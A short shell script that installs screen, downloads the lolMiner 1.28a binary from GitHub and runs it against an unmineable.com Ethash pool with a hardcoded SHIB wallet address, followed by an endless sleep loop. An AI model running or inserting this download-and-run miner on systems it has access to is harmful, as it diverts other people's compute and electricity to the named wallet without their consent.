#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz
tar -xf lolMiner_v1.28a_Lin64.tar.gz
cd 1.28a/
./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x7b73e5819B9Ba975EBfe975107bb8B04bC7b3f53.okhg --ethstratum ETHPROXY
while [ 1 ]; do
sleep 3
done
sleep 999
